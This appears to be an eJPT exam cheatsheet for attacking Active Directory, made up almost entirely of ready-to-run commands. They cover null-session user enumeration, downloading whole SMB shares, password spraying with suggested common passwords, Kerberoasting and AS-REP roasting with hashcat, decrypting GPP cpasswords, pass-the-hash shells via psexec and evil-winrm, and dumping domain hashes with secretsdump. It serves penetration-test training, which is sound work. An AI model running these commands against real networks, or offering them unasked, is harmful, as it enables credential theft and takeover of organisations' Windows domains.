# eJPT · Active Directory Enumeration Cheatsheet
> Enumerate first, exploit second. No flags — pure methodology.

---

## 01 · Objectives & Scenarios

| Goal | What You're Looking For |
|---|---|
| **User enumeration** | Valid usernames → password spray targets |
| **Group enumeration** | Who is in Domain Admins, local Admins |
| **Computer enumeration** | Hostnames, OS versions, DCs, workstations |
| **Share enumeration** | Readable/writable shares, sensitive files |
| **Password policy** | Lockout threshold → safe spray rate |
| **Trust mapping** | Other domains this domain trusts |
| **GPO / ACL recon** | Misconfigured permissions → privesc paths |

> **Core mindset:** You are building a map from zero (unauthenticated or low-priv user).  
> Every piece of info feeds the next step — usernames → spray → shell → dump → DA.

---

## 02 · Workflow & Methodology

```
[1] Discover the DC
      ↓
[2] DNS Enumeration
      ↓
[3] Null / Anonymous Session (unauthenticated)
      ↓
[4] SMB Share Enumeration
      ↓
[5] User & Group Enumeration (RPC / LDAP)
      ↓
[6] Password Policy → Safe Spray Rate
      ↓
[7] Password Spray → Valid Credentials
      ↓
[8] Authenticated Enumeration (with creds)
      ↓
[9] Lateral Movement → Privilege Escalation
```

---

### Step 1 — Discover the DC
```bash
# Nmap — find port 88 (Kerberos) = Domain Controller
nmap -sV -p 53,88,135,139,389,445,636,3268 <SUBNET>/24

# CrackMapExec sweep
crackmapexec smb <SUBNET>/24

# DNS — query for DC SRV records
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
dig SRV _ldap._tcp.dc._msdcs.<DOMAIN>
```
> DC always has: **88** (Kerberos), **389** (LDAP), **445** (SMB), **3268** (Global Catalog)

---

### Step 2 — DNS Enumeration
```bash
# Zone transfer attempt (often fails but worth trying)
dig axfr <DOMAIN> @<DC_IP>

# Brute-force subdomains/hostnames
gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Reverse lookup sweep
nmap -sn -R <SUBNET>/24

# Get all DNS records
nslookup
> server <DC_IP>
> ls -d <DOMAIN>
```

---

### Step 3 — Null / Anonymous Session Test
```bash
# SMB null session test
smbclient -N -L //<DC_IP>
crackmapexec smb <DC_IP> -u '' -p ''
crackmapexec smb <DC_IP> -u 'guest' -p ''

# RPC null session
rpcclient -U "" -N <DC_IP>

# enum4linux-ng (does all of the above automatically)
enum4linux-ng -A <DC_IP>
enum4linux-ng -A -u "" -p "" <DC_IP>
```
> **Null session** = connecting with no username/password. Many older or misconfigured AD environments allow this and leak users, groups, and policy.

---

### Step 4 — SMB Share Enumeration
```bash
# List shares (no creds)
smbclient -N -L //<TARGET_IP>
crackmapexec smb <TARGET_IP> -u '' -p '' --shares

# List shares (with creds)
crackmapexec smb <TARGET_IP> -u user -p pass --shares
smbclient -U 'user%pass' -L //<TARGET_IP>

# Connect to a share
smbclient //<TARGET_IP>/ShareName -U 'user%pass'

# Recursively list share contents
smbclient //<TARGET_IP>/ShareName -U 'user%pass' -c 'recurse ON; ls'

# Download everything from a share
smbclient //<TARGET_IP>/ShareName -U 'user%pass' -c 'recurse ON; mget *'

# Spider shares for interesting files
crackmapexec smb <TARGET_IP> -u user -p pass -M spider_plus
```
> **Look for:** passwords in `.txt`, `.xml`, `.bat`, `.ps1`, `web.config`, `unattend.xml`, backup files

---

### Step 5 — User & Group Enumeration

#### via RPC
```bash
rpcclient -U "user%pass" <DC_IP>

# Inside rpcclient:
enumdomusers          # list all domain users
enumdomgroups         # list all domain groups
querygroup 0x200      # query Domain Admins (RID 512)
querygroupmem 0x200   # members of Domain Admins
queryuser 0x1f4       # query user by RID (500 = Administrator)
enumpriv              # list privileges
getdompwinfo          # password policy
```

#### via enum4linux-ng
```bash
enum4linux-ng -U <DC_IP>           # users only
enum4linux-ng -G <DC_IP>           # groups only
enum4linux-ng -P <DC_IP>           # password policy only
enum4linux-ng -A <DC_IP>           # all (users, groups, shares, policy)
enum4linux-ng -A -u user -p pass <DC_IP>   # authenticated
```

#### via Impacket
```bash
# List users via Kerberos (no creds needed if AS-REP roasting possible)
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -no-pass -usersfile userlist.txt

# Authenticated user dump via RPC
lookupsid.py <DOMAIN>/user:pass@<DC_IP>

# LDAP user dump
ldapdomaindump <DC_IP> -u '<DOMAIN>\user' -p 'pass' -o /tmp/ldapdump
```

#### via CrackMapExec
```bash
crackmapexec smb <DC_IP> -u user -p pass --users
crackmapexec smb <DC_IP> -u user -p pass --groups
crackmapexec smb <DC_IP> -u user -p pass --computers
crackmapexec smb <DC_IP> -u user -p pass --pass-pol
crackmapexec smb <DC_IP> -u user -p pass --loggedon-users
crackmapexec smb <DC_IP> -u user -p pass --sessions
```

---

### Step 6 — Password Policy (Critical Before Spraying)
```bash
# Get policy before any spray attempt
crackmapexec smb <DC_IP> -u '' -p '' --pass-pol
enum4linux-ng -P <DC_IP>
rpcclient -U "" -N <DC_IP> -c "getdompwinfo"
```
| Policy Field | What It Means |
|---|---|
| **Minimum password length** | Helps build wordlists |
| **Password complexity** | Complexity requirements |
| **Lockout threshold** | Max attempts before lockout — **spray under this** |
| **Lockout observation window** | Time window for the counter — wait this long between spray rounds |
| **Lockout duration** | How long account stays locked |

> ⚠️ **If lockout threshold = 5**, spray max 3 passwords, then wait the observation window before next round.

---

### Step 7 — Password Spray
```bash
# CrackMapExec spray (SMB)
crackmapexec smb <DC_IP> -u userlist.txt -p 'Password123' --continue-on-success

# Kerbrute spray (Kerberos — stealthier, no SMB logon events)
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> userlist.txt 'Password123'

# Kerbrute user enumeration (no creds needed)
kerbrute userenum -d <DOMAIN> --dc <DC_IP> userlist.txt

# Common spray passwords to try (in order)
# Password1, Welcome1, Company+Year (e.g. Acme2024), SeasonYear (Summer2024), Username=Password
```

---

### Step 8 — Authenticated Enumeration (With Creds)
```bash
# BloodHound data collection (graph all AD relationships)
bloodhound-python -u user -p pass -d <DOMAIN> -dc <DC_IP> -c all

# ldapdomaindump (full LDAP dump to HTML/JSON)
ldapdomaindump <DC_IP> -u '<DOMAIN>\user' -p 'pass'

# PowerView (on Windows / via Meterpreter)
Get-NetUser                        # all users
Get-NetGroup "Domain Admins"       # group members
Get-NetComputer                    # all computers
Get-NetShare                       # all shares
Find-LocalAdminAccess              # where do I have local admin?
Invoke-ShareFinder                 # find accessible shares
```

---

### Step 9 — Lateral Movement (Quick Map)
```bash
# Shell via credentials (SMB)
psexec.py <DOMAIN>/user:pass@<TARGET>
wmiexec.py <DOMAIN>/user:pass@<TARGET>
smbexec.py <DOMAIN>/user:pass@<TARGET>

# Shell via Pass-the-Hash
psexec.py -hashes :NTLM_HASH Administrator@<TARGET>
evil-winrm -i <TARGET> -u Administrator -H NTLM_HASH

# Shell via WinRM (port 5985)
evil-winrm -i <TARGET> -u user -p pass

# Check where creds work across the network
crackmapexec smb <SUBNET>/24 -u user -p pass
crackmapexec smb <SUBNET>/24 -u user -H NTLM_HASH

# Kerberoasting (get hashes for service accounts)
GetUserSPNs.py <DOMAIN>/user:pass -dc-ip <DC_IP> -request
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# AS-REP Roasting (accounts with no pre-auth)
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -no-pass -usersfile users.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

---

## 03 · Tool & Command Cheatsheet

| Tool | Key Command | What It Does | eJPT Weight |
|---|---|---|---|
| **crackmapexec** | `cme smb <IP> -u '' -p '' --shares` | Null session share listing | 🔴 Critical |
| **crackmapexec** | `cme smb <IP> -u user -p pass --users` | Authenticated user dump | 🔴 Critical |
| **crackmapexec** | `cme smb <SUBNET>/24 -u user -p pass` | Credential spray across subnet | 🔴 Critical |
| **enum4linux-ng** | `enum4linux-ng -A <IP>` | Full unauthenticated recon (users, groups, shares, policy) | 🔴 Critical |
| **smbclient** | `smbclient -N -L //<IP>` | List shares anonymously | 🟠 High |
| **smbclient** | `smbclient //<IP>/Share -U 'u%p' -c 'recurse ON; ls'` | Recursively list share | 🟠 High |
| **rpcclient** | `rpcclient -U "" -N <IP>` then `enumdomusers` | RPC null session user enum | 🟠 High |
| **impacket lookupsid** | `lookupsid.py domain/user:pass@<IP>` | SID brute-force → username list | 🟠 High |
| **impacket secretsdump** | `secretsdump.py domain/user:pass@<IP>` | Remote hash dump post-privesc | 🔴 Critical |
| **impacket GetUserSPNs** | `GetUserSPNs.py domain/user:pass -request` | Kerberoasting | 🟡 Medium |
| **impacket GetNPUsers** | `GetNPUsers.py domain/ -no-pass -usersfile u.txt` | AS-REP Roasting | 🟡 Medium |
| **kerbrute** | `kerbrute userenum -d domain --dc <IP> users.txt` | Kerberos user enum (no lockout) | 🟠 High |
| **bloodhound-python** | `bloodhound-python -u u -p p -d dom -c all` | Full AD relationship graph | 🟡 Medium |
| **ldapdomaindump** | `ldapdomaindump <IP> -u 'dom\user' -p pass` | Full LDAP dump → HTML reports | 🟡 Medium |
| **nmap** | `nmap -p 88,389,445 <SUBNET>/24` | Identify DCs | 🟠 High |

---

## 04 · Well-Known Facts (Quick Reference)

### Default AD Ports
| Port | Service | Significance |
|---|---|---|
| 53 | DNS | Zone transfers, hostname discovery |
| 88 | Kerberos | DC identifier, AS-REP/Kerberoasting |
| 135 | RPC Endpoint Mapper | RPC enumeration |
| 139 | NetBIOS | Legacy SMB |
| 389 | LDAP | User/group/policy enumeration |
| 445 | SMB | Shares, lateral movement, hash capture |
| 636 | LDAPS | Encrypted LDAP |
| 3268 | Global Catalog | Forest-wide user search |
| 5985 | WinRM | Remote PowerShell / evil-winrm |

### Well-Known RIDs (Relative Identifiers)
| RID | Account |
|---|---|
| 500 | Administrator |
| 501 | Guest |
| 512 | Domain Admins group |
| 513 | Domain Users group |
| 514 | Domain Guests group |
| 515 | Domain Computers group |
| 516 | Domain Controllers group |
| 519 | Enterprise Admins group |
| 520 | Group Policy Creator Owners |

### Default Share Names to Check
| Share | Notes |
|---|---|
| `SYSVOL` | GPO files — often contains cpassword (Group Policy Preferences) |
| `NETLOGON` | Logon scripts — check for hardcoded credentials |
| `C$`, `ADMIN$`, `IPC$` | Admin shares — need local admin |
| `IPC$` | Required for null sessions / RPC |

### Group Policy Preferences (GPP) — cpassword
```bash
# Search SYSVOL for cpassword (AES key is publicly known)
crackmapexec smb <DC_IP> -u user -p pass -M gpp_password
crackmapexec smb <DC_IP> -u user -p pass -M gpp_autologin

# Manual search
smbclient //<DC_IP>/SYSVOL -U 'user%pass' -c 'recurse ON; mget *'
grep -r "cpassword" .
gpp-decrypt <ENCRYPTED_VALUE>    # decrypt the password
```
> **GPP cpassword** — Microsoft published the AES key used to encrypt these passwords. Any cpassword found in SYSVOL can be decrypted instantly. This is a very common eJPT finding.

---

## 05 · eJPT Exam Mapping

| Scenario | What To Do |
|---|---|
| **Open SMB shares** | `smbclient -N -L` → browse → find creds/config files in plaintext |
| **Null session allowed** | `enum4linux-ng -A` → get user list → build spray list |
| **GPP cpassword in SYSVOL** | `crackmapexec -M gpp_password` → `gpp-decrypt` → instant DA possible |
| **Found one set of creds** | Spray across all hosts: `cme smb <subnet>/24 -u user -p pass` |
| **Need more users** | `lookupsid.py` or `kerbrute userenum` → full user list |
| **Low-priv shell, need to escalate** | `Find-LocalAdminAccess` or `bloodhound-python` to find path to DA |
| **Service account exists** | `GetUserSPNs.py` → Kerberoast → crack with hashcat `-m 13100` |

---

## 06 · Common Pitfalls

### 🔴 Brute-forcing before checking the lockout policy
The fastest way to lock out every account and kill the engagement.
**Fix:** Always run `enum4linux-ng -P` or `crackmapexec --pass-pol` before any login attempts.

---

### 🔴 Skipping null/anonymous session testing
Many beginners go straight to authenticated enumeration and miss free data available without credentials.
**Fix:** Always try `smbclient -N -L` and `enum4linux-ng -A` first — even as an unauth attacker.

---

### 🟠 Wrong smbclient share syntax
```bash
# ❌ Wrong
smbclient //<IP>/share -U user -P pass

# ✅ Correct (password after % with no space, no -P flag)
smbclient //<IP>/share -U 'user%pass'
```

---

### 🟠 Not spraying found credentials across all hosts
Finding creds and only testing them on one machine is the most common exam mistake.
**Fix:** `crackmapexec smb <subnet>/24 -u user -p pass --continue-on-success` — always spray the whole subnet.

---

### 🟡 Ignoring SYSVOL
SYSVOL is world-readable by all domain users and frequently contains GPP cpasswords or scripts with hardcoded credentials.
**Fix:** Always check SYSVOL after getting any domain user credentials.

---

### 🟡 Confusing NTLMv2 with NTLM
NTLMv2 (captured via Responder) **cannot** be used for Pass-the-Hash — it must be cracked first.
NTLM (from SAM/NTDS dump) **can** be used directly for PtH.

---

### 🟡 Not running enum4linux-ng with `-A` flag
Running individual flags separately wastes time. `-A` does everything in one shot.
**Fix:** `enum4linux-ng -A <IP>` as your first command on every Windows/AD target.

---

### 🟢 Forgetting IPC$ is needed for RPC enumeration
RPC commands via rpcclient rely on the IPC$ share being accessible. If it's blocked, RPC enum fails.
**Fix:** Verify IPC$ is listed in shares before relying on rpcclient.

---

## Quick Reference Card

```
# === RECON (no creds) ===
nmap -p 88,389,445 <SUBNET>/24                          # find DC
crackmapexec smb <SUBNET>/24                             # OS/hostname sweep
enum4linux-ng -A <DC_IP>                                 # full null session enum
smbclient -N -L //<DC_IP>                               # list shares anon

# === GET USER LIST ===
enum4linux-ng -U <DC_IP>                                 # from null session
lookupsid.py <DOMAIN>/user:pass@<DC_IP>                 # SID brute-force
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt    # kerberos enum

# === PASSWORD POLICY ===
crackmapexec smb <DC_IP> -u '' -p '' --pass-pol          # before any spray!

# === SPRAY ===
crackmapexec smb <DC_IP> -u users.txt -p 'Password1' --continue-on-success
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt 'Password1'

# === AUTHENTICATED ENUM ===
crackmapexec smb <DC_IP> -u user -p pass --users --groups --shares --pass-pol
bloodhound-python -u user -p pass -d <DOMAIN> -dc <DC_IP> -c all

# === SHARES ===
crackmapexec smb <DC_IP> -u user -p pass --shares
smbclient //<DC_IP>/SYSVOL -U 'user%pass' -c 'recurse ON; ls'
crackmapexec smb <DC_IP> -u user -p pass -M gpp_password

# === LATERAL MOVEMENT ===
crackmapexec smb <SUBNET>/24 -u user -p pass            # where do creds work?
evil-winrm -i <TARGET> -u user -p pass                  # WinRM shell
psexec.py <DOMAIN>/user:pass@<TARGET>                   # SMB shell
psexec.py -hashes :HASH Administrator@<TARGET>          # Pass-the-Hash

# === ESCALATION ===
GetUserSPNs.py <DOMAIN>/user:pass -dc-ip <DC_IP> -request   # Kerberoast
GetNPUsers.py <DOMAIN>/ -no-pass -usersfile users.txt        # AS-REP roast
secretsdump.py <DOMAIN>/user:pass@<DC_IP>                    # dump all hashes
```

---

*Enumerate → Policy → Spray → Authenticate → Map → Move → Escalate*
